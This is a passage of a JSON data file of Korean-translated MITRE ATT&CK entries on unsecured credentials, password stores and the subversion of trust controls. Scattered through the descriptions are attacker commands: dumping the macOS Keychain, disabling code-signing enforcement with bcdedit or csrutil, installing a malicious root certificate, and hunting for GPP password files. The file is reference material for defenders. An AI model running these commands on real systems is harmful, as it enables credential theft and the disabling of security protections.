      "title": "Credentials in Registry",
      "translated": true
    },
    {
      "description": "위협 행위자는 손상된 시스템에서 부적절하게 저장된 자격 증명을 찾기 위해 bash 명령 기록을 검색할 수 있습니다. Bash는 사용자가 명령줄에 입력한 명령을 \"history\" 유틸리티를 통해 기록합니다. 사용자가 로그아웃하면, 이 기록은 사용자의 <code>.bash_history</code> 파일에 저장됩니다. 각 사용자에 대해 이 파일은 동일한 위치에 저장됩니다: <code>~/.bash_history</code>. 일반적으로 이 파일은 사용자의 마지막 500개 명령어를 기록합니다. 사용자는 종종 프로그램의 매개변수로 명령줄에 사용자 이름과 비밀번호를 입력하며, 사용자가 로그아웃할 때 이 정보가 해당 파일에 저장됩니다. 위협 행위자는 이 파일을 살펴보며 잠재적인 자격 증명을 악용할 수 있습니다. (출처: DA 외부, OS X 방식)",
      "external_id": "T1552.003",
      "modified": "2024-09-12T15:24:04.912Z",
      "title": "Bash History",
      "translated": true
    },
    {
      "description": "공격자는 손상된 시스템에서 안전하지 않게 저장된 자격 증명을 찾기 위해 개인 키 인증서 파일을 검색할 수 있습니다. 개인 암호화 키와 인증서는 인증, 암호화/복호화 및 디지털 서명에 사용됩니다. 일반적인 키 및 인증서 파일 확장자는 다음과 같습니다: .key, .pgp, .gpg, .ppk, .p12, .pem, .pfx, .cer, .p7b, .asc.\n\n공격자는 또한 * nix 기반 시스템의 경우 <code>~/.ssh</code>와 같은 일반적인 키 디렉터리나 Windows의 경우 <code>C:\\Users\\(사용자 이름)\\.ssh\\</code>에서 SSH 키를 검색할 수 있습니다. 공격자 도구 또한 손상된 시스템에서 암호화 키 및 인증서와 관련된 파일 확장자를 검색할 수 있습니다.\n\n장치가 Entra ID에 등록되면 장치 키와 전송 키가 생성되어 장치의 신원을 확인하는 데 사용됩니다. 장치에 접근할 수 있는 공격자는 이러한 키를 내보내 장치를 가장할 수 있습니다.\n\n네트워크 장치에서는 `crypto pki export`와 같은 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008) 명령을 통해 개인 키가 내보내질 수 있습니다.\n\n일부 개인 키는 작업을 위해 비밀번호나 암호 문구가 필요하므로, 공격자는 [입력 캡처](https://attack.mitre.org/techniques/T1056)를 사용하여 키로깅을 하거나 오프라인에서 비밀번호를 [브루트 포스](https://attack.mitre.org/techniques/T1110) 공격하려 시도할 수 있습니다. 이러한 개인 키는 SSH와 같은 [원격 서비스](https://attack.mitre.org/techniques/T1021)에 인증하는 데 사용되거나 이메일과 같은 다른 수집된 파일을 복호화하는 데 사용될 수 있습니다.",
      "external_id": "T1552.004",
      "modified": "2024-10-04T11:31:56.622Z",
      "title": "Private Keys",
      "translated": true
    },
    {
      "description": "공격자는 클라우드 인스턴스 메타데이터 API에 접근하여 자격 증명 및 기타 민감한 데이터를 수집하려고 시도할 수 있습니다.\n\n대부분의 클라우드 서비스 제공업체는 실행 중인 가상 인스턴스에게 정보를 제공하는 서비스인 클라우드 인스턴스 메타데이터 API를 지원합니다. 일반적으로 제공되는 정보에는 이름, 보안 그룹 및 자격 증명과 추가 비밀이 포함될 수 있는 UserData 스크립트와 같은 민감한 데이터를 포함한 추가 메타데이터가 포함됩니다. 인스턴스 메타데이터 API는 애플리케이션 관리에 도움을 주기 위해 제공되며 인스턴스에 접근할 수 있는 누구나 접근할 수 있습니다.(인용: AWS 인스턴스 메타데이터 API) 클라우드 메타데이터 API는 최소한 한 건의 고 프로파일 손상 사건에서 사용되었습니다.(인용: Krebs Capital One 2019년 8월)\n\n공격자가 실행 중인 가상 인스턴스에 존재하는 경우, 그들은 인스턴스 메타데이터 API를 직접 쿼리하여 추가 리소스에 접근할 수 있는 자격 증명을 식별할 수 있습니다. 또한, 공격자는 공개적으로 노출된 웹 프록시에서 서버 측 요청 위조(SSRF) 취약점을 악용하여 인스턴스 메타데이터 API에 대한 요청을 통해 민감한 정보에 접근할 수 있습니다.(인용: RedLock 인스턴스 메타데이터 API 2018)\n\n클라우드 서비스 제공업체에서의 사실상의 표준은 인스턴스 메타데이터 API를 <code>http[:]//169.254.169.254</code>에 호스팅하는 것입니다.",
      "external_id": "T1552.005",
      "modified": "2024-10-15T16:24:20.219Z",
      "title": "Cloud Instance Metadata API",
      "translated": true
    },
    {
      "description": "대적자는 그룹 정책 환경 설정(Group Policy Preferences, GPP)에서 보안이 없는 자격 증명을 찾으려고 시도할 수 있습니다. GPP는 관리자가 내장된 자격 증명을 포함하는 도메인 정책을 생성할 수 있도록 해주는 도구입니다. 이러한 정책을 사용하면 관리자가 로컬 계정을 설정할 수 있습니다. (출처: Microsoft GPP 2016)\n\n이 그룹 정책은 도메인 컨트롤러의 SYSVOL에 저장됩니다. 이는 모든 도메인 사용자가 SYSVOL 공유를 볼 수 있고(공개된 AES 키를 사용하여) 암호를 복호화할 수 있음을 의미합니다. (출처: Microsoft GPP Key)\n\n다음 도구와 스크립트를 사용하여 그룹 정책 환경 설정 XML 파일에서 암호 파일을 수집하고 복호화할 수 있습니다:\n\n* Metasploit의 포스트 익스플로잇 모듈: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword (출처: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nSYSVOL 공유에서 대적자는 잠재적인 GPP XML 파일을 열거하기 위해 다음 명령어를 사용할 수 있습니다: <code>dir /s *.xml</code>",
      "external_id": "T1552.006",
      "modified": "2024-08-15T13:21:22.734Z",
      "title": "Group Policy Preferences",
      "translated": true
    },
    {
      "description": "적대적 행위자는 컨테이너 환경 내에서 API를 통해 자격 증명을 수집할 수 있습니다. 이러한 환경의 API, 예를 들어 Docker API와 Kubernetes API는 사용자가 자신의 컨테이너 리소스와 클러스터 구성 요소를 원격으로 관리할 수 있도록 합니다. (인용: Docker API) (인용: Kubernetes API)\n\n적대적 행위자는 Docker API에 접근하여 클라우드, 컨테이너 및 환경 내의 다양한 다른 리소스에 대한 자격 증명을 포함하는 로그를 수집할 수 있습니다. (인용: Unit 42 Unsecured Docker Daemons) 충분한 권한을 가진 적대적 행위자는 포드의 서비스 계정을 통해 Kubernetes API를 사용하여 Kubernetes API 서버에서 자격 증명을 검색할 수도 있습니다. 이러한 자격 증명에는 Docker API 인증에 필요한 정보 또는 Kubernetes 클러스터 구성 요소의 비밀이 포함될 수 있습니다.",
      "external_id": "T1552.007",
      "modified": "2024-10-15T16:25:28.820Z",
      "title": "Container API",
      "translated": true
    },
    {
      "description": "위협 행위자들은 사용자 커뮤니케이션 서비스에 저장되거나 전송된 보안이 취약한 자격 증명을 직접 수집할 수 있습니다. 자격 증명은 이메일, Slack 또는 Teams와 같은 채팅 서비스, Jira 또는 Trello와 같은 협업 도구 및 사용자 커뮤니케이션을 지원하는 기타 서비스와 같은 사용자 채팅 커뮤니케이션 애플리케이션을 통해 전송되고 저장될 수 있습니다. 사용자는 개인 또는 공개 기업 내부 커뮤니케이션 채널에서 사용자 이름과 비밀번호, API 키 또는 인증 토큰과 같은 다양한 형태의 자격 증명을 공유할 수 있습니다.\n\n저장된 채팅 로그에 접근하기보다는 (즉, [파일 내 자격 증명](https://attack.mitre.org/techniques/T1552/001)), 위협 행위자들은 사용자 엔드포인트 내의 이러한 서비스에서 자격 증명에 직접 접근하거나, 서비스를 호스팅하는 서버를 통해 또는 클라우드 호스팅 서비스의 관리자 포털을 통해 접근할 수 있습니다. 위협 행위자는 또한 Slack 워크플로우와 같은 통합 도구를 손상시켜 메시지를 자동으로 검색하고 사용자 자격 증명을 추출할 수 있습니다. 이러한 자격 증명은 이후의 활동(예: 수평 이동이나 권한 상승)을 수행하는 데 악용될 수 있습니다 (출처: Slack 보안 위험).",
      "external_id": "T1552.008",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Chat Messages",
      "translated": true
    },
    {
      "description": "적대자는 사용자에게 비신뢰 활동에 대한 경고를 보내거나 비신뢰 프로그램의 실행을 차단하는 보안 통제를 약화시킬 수 있습니다. 운영 체제와 보안 제품은 프로그램이나 웹사이트가 일정 수준의 신뢰를 갖고 있다고 식별할 수 있는 메커니즘을 포함할 수 있습니다. 이러한 기능의 예로는 유효한 코드 서명 인증서로 서명된 프로그램이 실행을 허가받거나, 인터넷에서 다운로드된 속성으로 인해 프로그램이 사용자에게 경고를 표시하거나, 비신뢰 사이트에 연결하기 직전인 경우 알림을 받는 것이 있습니다.\n\n적대자는 이러한 신뢰 메커니즘을 무력화하려고 시도할 수 있습니다. 적대자가 사용하는 방법은 그들이 무력화하려는 특정 메커니즘에 따라 달라집니다. 적대자는 이러한 통제를 무력화하기 위해 [파일 및 디렉터리 권한 수정](https://attack.mitre.org/techniques/T1222) 또는 [레지스트리 수정](https://attack.mitre.org/techniques/T1112)을 수행할 수 있습니다. (출처: SpectorOps Subverting Trust Sept 2017) 적대자는 또한 타깃 시스템에서 신뢰를 얻기 위해 코드 서명 인증서를 생성하거나 탈취할 수도 있습니다. (출처: Securelist Digital Certificates)(출처: Symantec Digital Certificates)",
      "external_id": "T1553",
      "modified": "2024-03-01T17:17:37.292Z",
      "title": "Subvert Trust Controls",
      "translated": true
    },
    {
      "description": "위협 행위자는 파일 속성을 수정하고 Gatekeeper 기능을 무효화하여 사용자 프롬프트를 회피하고 신뢰되지 않은 프로그램을 실행할 수 있습니다. Gatekeeper는 호스트에서 신뢰할 수 있는 응용 프로그램만 실행되도록 보장하는 Apple의 보안 모델의 한 층으로 작용하는 기술 집합입니다. Gatekeeper는 Snow Leopard(10.6, 2009)의 파일 격리(File Quarantine) 위에 세워졌으며, 현재 코드 서명(Code Signing), 보안 정책 준수, 공증(Notarization) 등을 포함하도록 발전했습니다. Gatekeeper는 처음 실행되는 응용 프로그램과 재실행되는 응용 프로그램을 다르게 처리합니다. (출처: TheEclecticLightCompany Quarantine and the flag)(출처: TheEclecticLightCompany apple notarization)\n\n옵트인 시스템을 기반으로 하여, 파일이 다운로드될 때 다운로드를 수행하는 응용 프로그램에 의해 `com.apple.quarantine`(공격 플래그로도 알려짐)이라는 확장 속성이 파일에 설정될 수 있습니다. 런치 서비스(Launch Services)는 응용 프로그램을 일시 중지된 상태로 엽니다. 격리 플래그가 설정된 첫 실행 응용 프로그램의 경우, Gatekeeper는 다음과 같은 기능을 실행합니다:\n\n1. 확장 속성 확인 - Gatekeeper는 격리 플래그를 확인한 후, 실행을 허용하거나 거부할 수 있도록 사용자에게 경고 프롬프트를 제공합니다. (출처: OceanLotus for OS X)(출처: 20 macOS Common Tools and Techniques)\n\n2. 시스템 정책 확인 - Gatekeeper는 시스템 보안 정책을 확인하여 App Store 또는 App Store와 확인된 개발자에서 다운로드된 응용 프로그램의 실행을 허용합니다.\n\n3. 코드 서명 - Gatekeeper는 Apple 개발자 ID의 유효한 코드 서명을 확인합니다.\n\n4. 공증 - `api.apple-cloudkit.com` API를 사용하여 Gatekeeper는 Apple 서버에 연결하여 공증 티켓을 확인하거나 다운로드하고 티켓이 취소되지 않았는지 확인합니다. 사용자는 공증을 무시할 수 있으며, 이는 “허가되지 않은 응용 프로그램” 실행 프롬프트를 초래하고 보안 정책이 수정됩니다.\n\n위협 행위자는 논리 오류(예: [방어 회피를 위한 이용](https://attack.mitre.org/techniques/T1211)), 확인되지 않은 파일 유형 및 외부 라이브러리를 통해 Gatekeeper 검사의 하나 이상의 보안 통제를 무효화할 수 있습니다. 예를 들어, macOS 13 Ventura 이전에는 코드 서명 및 공증 검사가 첫 실행 시에만 수행되었기 때문에, 위협 행위자는 Gatekeeper 보안 검사를 우회하기 위해 이전에 열린 응용 프로그램에 악성 실행 파일을 작성할 수 있었습니다. (출처: theevilbit gatekeeper bypass 2021)(출처: Application Bundle Manipulation Brandon Dalton)\n\nUSB 플래시 드라이브, 옵티컬 디스크, 외장 하드 드라이브, 로컬 네트워크에서 공유되는 드라이브 또는 curl 명령을 사용하여 시스템에 로드된 응용 프로그램과 파일은 격리 플래그를 설정하지 않을 수 있습니다. 또한, [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)를 사용하여 격리 플래그 설정을 회피할 수도 있습니다.",
      "external_id": "T1553.001",
      "modified": "2022-10-21T19:30:58.414Z",
      "title": "Gatekeeper Bypass",
      "translated": true
    },
    {
      "description": "적대자는 악성 코드나 도구에 서명하기 위해 코드 서명 재료를 생성, 획득 또는 도용할 수 있습니다. 코드 서명은 개발자로부터 바이너리에 대한 진위 수준을 제공하며, 바이너리가 변조되지 않았음을 보장합니다. (출처: 위키피디아 코드 서명) 작전 중에 사용되는 인증서는 적대자가 생성, 획득 또는 도용할 수 있습니다. (출처: Securelist 디지털 인증서) (출처: Symantec 디지털 인증서) [유효하지 않은 코드 서명](https://attack.mitre.org/techniques/T1036/001)과 달리, 이 활동은 유효한 서명으로 이어질 것입니다.\n\n소프트웨어의 첫 실행 시 검증을 위한 코드 서명은 최신 Windows 및 macOS 시스템에서 사용될 수 있습니다. 리눅스는 분산된 특성 때문에 사용되지 않습니다. (출처: 위키피디아 코드 서명)(출처: EclecticLightChecksonEXECodeSigning)\n\n코드 서명 인증서는 시스템에서 실행되기 위해 서명된 코드가 필요하다는 보안 정책을 우회하는 데 사용될 수 있습니다.",
      "external_id": "T1553.002",
      "modified": "2022-09-22T19:13:52.548Z",
      "title": "Code Signing",
      "translated": true
    },
    {
      "description": "공격자는 SIP 및 신뢰 공급자 구성 요소를 조작하여 서명 검증 확인을 수행할 때 운영 체제와 애플리케이션 제어 도구를 오도할 수 있습니다. 사용자 모드에서는 Windows Authenticode(참고: Microsoft Authenticode) 디지털 서명이 파일의 출처와 무결성을 확인하는 데 사용되며, 이는 서명된 코드에 대한 신뢰를 설정하는 데 사용될 수 있는 변수입니다(예: 유효한 Microsoft 서명이 있는 드라이버는 안전한 것으로 처리될 수 있음). 서명 검증 과정은 WinVerifyTrust 응용 프로그래밍 인터페이스(API) 함수(참고: Microsoft WinVerifyTrust)를 통해 처리되며, 이 함수는 조회를 수용하고 서명의 매개 변수를 검증하는 신뢰 공급자와 조정합니다(참고: SpectorOps Subverting Trust Sept 2017).\n\n실행 파일 형식과 해당 서명 형식의 다양성 때문에 Microsoft는 API 함수와 파일 간의 추상화 계층을 제공하기 위해 주제 인터페이스 패키지(SIPs)(참고: EduardosBlog SIPs July 2008)라는 소프트웨어 구성 요소를 만들었습니다. SIP는 서명을 생성, 검색, 계산 및 검증할 수 있도록 API 함수를 지원하는 역할을 합니다. 대부분의 파일 형식(실행 파일, PowerShell, 설치 프로그램 등)에 대해 고유한 SIP가 존재하며, 이러한 SIP는 전역 고유 식별자(GUID)로 식별됩니다(참고: SpectorOps Subverting Trust Sept 2017).\n\n[코드 서명](https://attack.mitre.org/techniques/T1553/002)과 유사하게, 공격자는 이러한 아키텍처를 악용하여 신뢰 제어를 회피하고 시스템에서 합법적으로 서명된 코드만 실행할 수 있도록 하는 보안 정책을 우회할 수 있습니다. 공격자는 SIP 및 신뢰 공급자 구성 요소를 장악하여 운영 체제와 애플리케이션 제어 도구가 악의적인 코드(또는 기타 코드)를 서명된 것으로 분류하도록 오도할 수 있습니다(참고: SpectorOps Subverting Trust Sept 2017).\n\n* <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code>에서 동적 링크 라이브러리(DLL)가 SIP의 CryptSIPDllGetSignedDataMsg 함수를 제공하는 값을 수정합니다. 이 함수는 서명된 파일에서 인코딩된 디지털 인증서를 검색합니다. 악의적으로 조작된 DLL를 가리키며, 항상 알려진 올바른 서명 값을 반환하는 내보내기 함수(예: Portable Executables용 Microsoft 서명)를 가지고 있다면, 공격자는 해당 SIP를 사용하는 모든 파일에 허용되는 서명 값을 적용할 수 있습니다(참고: GitHub SIP POC Sept 2017) (해시 불일치가 발생하여 서명이 무효화될 수 있습니다. 함수에서 반환되는 해시가 파일로부터 계산된 값과 일치하지 않을 것이기 때문입니다).\n* <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code>에서 SIP의 CryptSIPDllVerifyIndirectData 함수를 제공하는 DLL를 가리키는 값을 수정합니다. 이 함수는 파일의 계산된 해시를 서명된 해시 값과 비교하여 검증합니다. 항상 TRUE(검증이 성공적으로 수행되었다는 표시)를 반환하는 내보내기 함수를 가진 악의적으로 조작된 DLL로 가리켰다면, 공격자는 해당 SIP를 사용하여 어떤 파일(합법적인 서명 포함)도 성공적으로 검증할 수 있습니다(참고: GitHub SIP POC Sept 2017) (앞서 언급한 CryptSIPDllGetSignedDataMsg 함수의 장악 여부와 관계없이). 이 레지스트리 값은 새로운 파일을 드롭하고 실행할 필요 없이 이미 존재하는 DLL의 적절한 내보내기 함수로 전환될 수도 있습니다.\n* <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code>에서 신뢰 공급자의 FinalPolicy 함수를 제공하는 DLL을 가리키는 값을 수정합니다. 이곳에서 디코딩되고 구문 분석된 서명이 확인되며 대부분의 신뢰 결정이 이루어집니다. SIP의",
      "external_id": "T1553.003",
      "modified": "2022-05-05T04:58:58.214Z",
      "title": "SIP and Trust Provider Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 손상된 시스템에 루트 인증서를 설치하여 공격자가 제어하는 웹 서버에 연결할 때 경고를 피할 수 있습니다. 루트 인증서는 공개 키 암호화에서 루트 인증 기관(CA)을 식별하는 데 사용됩니다. 루트 인증서가 설치되면 시스템이나 응용 프로그램은 루트 인증서에 의해 서명된 신뢰 체인 내의 인증서를 신뢰합니다.(출처: 위키백과 루트 인증서) 인증서는 웹 브라우저 내에서 안전한 TLS/SSL 통신을 구축하는 데 일반적으로 사용됩니다. 사용자가 신뢰되지 않는 인증서를 제시하는 웹사이트를 탐색하려고 할 때, 보안 위험을 경고하는 오류 메시지가 표시됩니다. 보안 설정에 따라 브라우저는 사용자가 웹사이트에 연결하는 것을 허용하지 않을 수도 있습니다.\n\n손상된 시스템에 루트 인증서를 설치하는 것은 공격자에게 해당 시스템의 보안을 저하시킬 수 있는 방법을 제공합니다. 공격자는 이 기술을 사용하여 손상된 시스템이 공격자가 제어하는 웹 서버에 HTTPS로 연결할 때 사용자에게 보안 경고를 제거하여 실제 웹사이트를 사칭해 로그인 정보를 수집하게 했습니다.(출처: 작전 에멘탈)\n\n비정상적인 루트 인증서는 제조업체 또는 소프트웨어 공급망에 의해 시스템에 미리 설치되었으며, 악성코드/애드웨어와 함께 사용되어 안전한 TLS/SSL 통신에서 전송되는 정보를 가로채는 중간자 공격 기능을 제공했습니다.(출처: 카스퍼스키 슈퍼피쉬)\n\n루트 인증서(및 관련 체인)는 복제하여 재설치할 수도 있습니다. 복제된 인증서 체인은 원본의 많은 메타데이터 특성을 포함할 수 있으며, 악성 코드를 서명하는 데 사용될 수 있습니다. 이는 서명 유효성 검사 도구(예: Sysinternals, 안티바이러스 등)를 우회하여 실행을 차단하거나 지속성의 유물을 발견하는 데 사용됩니다.(출처: 스펙터옵스 코드 서명 2017년 12월)\n\nmacOS에서 Ay MaMi 악성코드는 <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> 를 사용하여 악성 인증서를 시스템 키체인에 신뢰된 루트 인증서로 설치합니다.(출처: objective-see ay mami 2018)",
      "external_id": "T1553.004",
      "modified": "2024-01-04T20:01:27.662Z",
      "title": "Install Root Certificate",
      "translated": true
    },
    {
      "description": "적대 세력은 특정 파일 형식을 악용하여 웹에서의 표시(Mark-of-the-Web, MOTW) 제어를 우회할 수 있습니다. Windows에서 파일이 인터넷에서 다운로드되면, 해당 파일은 `<code>Zone.Identifier</code>`라는 이름의 숨겨진 NTFS 대체 데이터 스트림(ADS)으로 태그가 붙여지며, 특정 값인 MOTW가 지정됩니다. MOTW가 태그된 파일은 보호되며 특정 작업을 수행할 수 없습니다. 예를 들어, MS Office 10부터 MOTW가 있는 MS Office 파일은 보호 뷰에서 열리게 됩니다. MOTW가 태그된 실행 파일은 Windows Defender SmartScreen에 의해 처리되며, 이는 잘 알려진 실행 파일의 허용 목록과 비교하여 파일을 검사합니다. 파일이 알려지지 않거나 신뢰할 수 없는 경우, SmartScreen은 실행을 차단하고 사용자에게 실행하지 말라고 경고합니다.\n\n적대 세력은 압축/아카이브(.arj, .gzip) 및/또는 디스크 이미지(.iso, .vhd)와 같은 컨테이너 파일 형식을 악용하여 MOTW로 태그되지 않을 수 있는 악성 페이로드를 전달할 수 있습니다. 인터넷에서 다운로드된 컨테이너 파일은 MOTW로 표시되지만, 컨테이너 파일이 추출되거나 탑재될 경우 내부의 파일은 MOTW를 유산받지 않을 수 있습니다. MOTW는 NTFS 기능이며 많은 컨테이너 파일은 NTFS 대체 데이터 스트림을 지원하지 않습니다. 컨테이너 파일이 추출되거나 탑재된 후, 그 안에 포함된 파일은 로컬 디스크의 파일로 간주되어 보호 없이 실행될 수 있습니다.",
      "external_id": "T1553.005",
      "modified": "2023-03-22T14:19:50.768Z",
      "title": "Mark-of-the-Web Bypass",
      "translated": true
    },
    {
      "description": "위협 행위자는 서명되지 않았거나 자체 서명된 코드의 실행을 가능하게 하기 위해 코드 서명 정책을 수정할 수 있습니다. 코드 서명은 개발자로부터 프로그램에 대한 일정 수준의 신뢰성을 제공하며, 프로그램이 변조되지 않았음을 보장합니다. 보안 제어는 운영 체제에서 유효하고 서명된 코드만 실행될 수 있도록 보장하는 강제 메커니즘을 포함할 수 있습니다.\n\n이러한 보안 제어 중 일부는 기본적으로 활성화되어 있을 수 있으며, 예를 들어 Windows의 드라이버 서명 강제(DSE) 또는 macOS의 시스템 무결성 보호(SIP)와 같은 것이 있습니다. (출처: Microsoft DSE 2017년 6월)(출처: Apple SIP 비활성화) 반면, 서명된 동적 링크 라이브러리(DLL)만 시스템에서 실행되도록 허용하는 등 일부 제어는 기본적으로 비활성화되어 있지만 애플리케이션 제어를 통해 구성할 수 있습니다. 개발자들이 애플리케이션 개발 및 테스트 중 기본 서명 강제 정책을 수정하는 것이 유용할 수 있으므로, 이러한 기능의 비활성화는 고급 권한을 통해 가능할 수 있습니다. (출처: Microsoft 서명되지 않은 드라이버 2017년 4월)(출처: Apple SIP 비활성화)\n\n위협 행위자는 커맨드 라인이나 GUI 유틸리티를 사용하거나, [레지스트리 수정](https://attack.mitre.org/techniques/T1112), 컴퓨터를 디버그/복구 모드로 재부팅하거나, 커널 메모리에서 변수 값을 변경하는 방법 등 여러 방법으로 코드 서명 정책을 수정할 수 있습니다. (출처: Microsoft TESTSIGNING 2021년 2월)(출처: Apple SIP 비활성화)(출처: FireEye HIKIT 루트킷 2부)(출처: GitHub Turla 드라이버 로더) 예를 들어, Windows에서 <code>bcdedit.exe -set TESTSIGNING ON</code> 명령이나, macOS에서 <code>csrutil disable</code> 명령을 사용하여 시스템의 코드 서명 정책을 수정할 수 있습니다. (출처: Microsoft TESTSIGNING 2021년 2월)(출처: Apple SIP 비활성화) 구현에 따라 서명 정책의 성공적인 수정은 감염된 시스템의 재부팅을 요구할 수 있습니다. 또한 일부 구현은 사용자에게 가시적인 아티팩트를 생성할 수 있습니다 (예: 화면 모서리에 시스템이 테스트 모드에 있음을 나타내는 워터마크). 위협 행위자는 이러한 아티팩트를 제거하려고 시도할 수 있습니다. (출처: F-Secure BlackEnergy 2014)\n\n서명 검사와 관련된 변수를 수정하기 위해 커널 메모리에 접근하여 <code>g_CiOptions</code>를 변경하여 드라이버 서명 강제를 비활성화하려면, 위협 행위자는 서명된 취약한 드라이버를 사용하여 [특권 상승을 위한 악용](https://attack.mitre.org/techniques/T1068)을 수행할 수 있습니다. (출처: Unit42 AcidBox 2020년 6월)(출처: GitHub Turla 드라이버 로더)",
      "external_id": "T1553.006",
      "modified": "2022-05-05T05:00:03.480Z",
      "title": "Code Signing Policy Modification",
      "translated": true
    },
    {
      "description": "공격자는 시스템에 대한 지속적인 접근을 확보하기 위해 호스트 소프트웨어 바이너리를 수정할 수 있습니다. 소프트웨어 바이너리/실행 파일은 다양한 시스템 명령이나 서비스, 프로그램 및 라이브러리를 제공합니다. 일반적인 소프트웨어 바이너리에는 SSH 클라이언트, FTP 클라이언트, 이메일 클라이언트, 웹 브라우저 및 여러 사용자 또는 서버 애플리케이션이 포함됩니다.\n\n공격자는 호스트 소프트웨어 바이너리를 수정하여 지속성을 확립할 수 있습니다. 예를 들어, 공격자는 합법적인 애플리케이션 바이너리(또는 지원 파일)를 백도어가 포함된 것으로 대체하거나 감염시킬 수 있습니다. 이러한 바이너리는 애플리케이션 또는 사용자가 자주 실행할 수 있기 때문에 공격자는 이를 통해 호스트에 대한 지속적인 접근을 활용할 수 있습니다. 공격자는 SSH 클라이언스와 같은 소프트웨어 바이너리를 수정하여 로그인 중에 자격 증명을 지속적으로 수집할 수도 있습니다 (즉, [인증 프로세스 수정](https://attack.mitre.org/techniques/T1556)).(출처: Google Cloud Mandiant UNC3886 2024)\n\n공격자는 또한 기존 바이너리를 악의적인 기능으로 패치하여 수정할 수 있습니다 (예: IAT 훅킹/진입점 패치) (출처: Unit42 Banking Trojans Hooking 2022) 이 바이너리가 합법적으로 실행되기 전에 이루어집니다. 예를 들어, 공격자는 바이너리의 진입점을 수정하여 정상 실행 흐름이 재개되기 전에 공격자가 패치한 악의적인 코드로 향하게 할 수 있습니다. (출처: ESET FontOnLake Analysis 2021)\n\n바이너리를 수정한 이후에 공격자는 [방어 무력화](https://attack.mitre.org/techniques/T1562)를 시도할 수 있으며, 이는 업데이트를 방지하는 것으로 이루어질 수 있습니다 (예: Linux 시스템에서 yum 패키지 관리자를 사용하는 경우 `yum-versionlock` 명령 또는 `versionlock.list` 파일을 통해). (출처: Google Cloud Mandiant UNC3886 2024)",
      "external_id": "T1554",
      "modified": "2024-10-12T16:52:46.067Z",
      "title": "Compromise Host Software Binary",
      "translated": true
    },
    {
      "description": "적대자가 사용자 자격 증명을 획득하기 위해 일반적인 비밀번호 저장 위치를 검색할 수 있습니다. (출처: F-Secure The Dukes) 비밀번호는 운영 체제나 자격 증명을 보유한 애플리케이션에 따라 시스템의 여러 장소에 저장됩니다. 또한 사용자가 비밀번호를 더 쉽게 관리하고 유지할 수 있도록 도와주는 특정 애플리케이션과 서비스도 존재하며, 예를 들어 비밀번호 관리자 및 클라우드 비밀 저장소가 있습니다. 자격 증명이 획득되면 이를 통해 수평 이동을 수행하고 제한된 정보에 접근할 수 있습니다.",
      "external_id": "T1555",
      "modified": "2024-10-15T14:57:46.850Z",
      "title": "Credentials from Password Stores",
      "translated": true
    },
    {
      "description": "공격자는 Keychain에서 자격 증명을 획득할 수 있습니다. Keychain(또는 Keychain 서비스)은 계정 이름, 비밀번호, 개인 키, 인증서, 민감한 애플리케이션 데이터, 결제 데이터 및 보안 메모를 저장하는 macOS 자격 증명 관리 시스템입니다. Keychain의 세 가지 유형은 로그인 Keychain, 시스템 Keychain 및 로컬 항목(iCloud) Keychain입니다. 기본 Keychain은 로그인 Keychain으로, 사용자 비밀번호와 정보를 저장합니다. 시스템 Keychain은 운영 체제가 액세스하는 항목, 즉 호스트의 사용자 간에 공유되는 항목을 저장합니다. 로컬 항목(iCloud) Keychain은 Apple의 iCloud 서비스와 동기화된 항목에 사용됩니다.\n\nKeychain은 Keychain Access 애플리케이션을 통해 또는 명령줄 유틸리티 <code>security</code>를 사용하여 조회 및 편집할 수 있습니다. Keychain 파일은 <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, <code>/Network/Library/Keychains/</code>에 위치해 있습니다.(출처: Keychain Services Apple)(출처: Keychain Decryption Passware)(출처: OSX Keychain Schaumann)\n\n공격자는 Keychain 저장소/메모리에서 사용자 자격 증명을 수집할 수 있습니다. 예를 들어, 명령 <code>security dump-keychain –d</code>는 <code>~/Library/Keychains/login.keychain-db</code>에서 모든 로그인 Keychain 자격 증명을 덤프합니다. 공격자는 <code>~/Library/Keychains/login.keychain</code> 파일에서 로그인 Keychain 자격 증명을 직접 읽을 수도 있습니다. 두 방법 모두 비밀번호가 필요하며, 로그인 Keychain의 기본 비밀번호는 현재 사용자의 macOS 호스트 로그인 비밀번호입니다.(출처: External to DA, the OS X Way)(출처: Empire Keychain Decrypt)",
      "external_id": "T1555.001",
      "modified": "2024-10-15T16:35:39.985Z",
      "title": "Keychain",
      "translated": true
    },
    {
      "description": "루트 접근 권한을 가진 공격자는 `securityd`의 메모리를 읽어 자격 증명을 수집할 수 있습니다. `securityd`는 암호화 및 인증과 같은 보안 프로토콜을 구현하는 서비스를 담당하는 데몬입니다. (출처: Apple Dev SecurityD) 특권을 가진 공격자는 `securityd`의 메모리를 스캔하여 사용자의 로그인 키체인을 해독하는 데 필요한 올바른 키 시퀀스를 찾을 수 있습니다. 이를 통해 공격자는 사용자, WiFi, 이메일, 브라우저, 인증서, 보안 노트 등 여러 개의 평문 비밀번호에 접근할 수 있습니다. (출처: OS X Keychain)(출처: OSX Keydnap 악성 소프트웨어)\n\nEl Capitan 이전의 OS X에서는 루트 접근 권한을 가진 사용자가 로그인 사용자들의 평문 키체인 비밀번호를 읽을 수 있습니다. 이는 Apple의 키체인 구현이 이러한 자격 증명을 캐싱할 수 있도록 하기 때문에 사용자가 반복적으로 비밀번호 입력을 요구받지 않게 됩니다. (출처: OS X Keychain)(출처: External to DA, the OS X Way) Apple의 `securityd` 유틸리티는 사용자의 로그인 비밀번호를 받아 PBKDF2로 암호화하여 이 마스터 키를 메모리에 저장합니다. Apple은 또한 사용자의 비밀번호를 암호화하기 위해 일련의 키와 알고리즘을 사용하지만, 마스터 키를 찾은 공격자는 최종 비밀번호를 잠금 해제하기 위해 다른 값들을 반복적으로 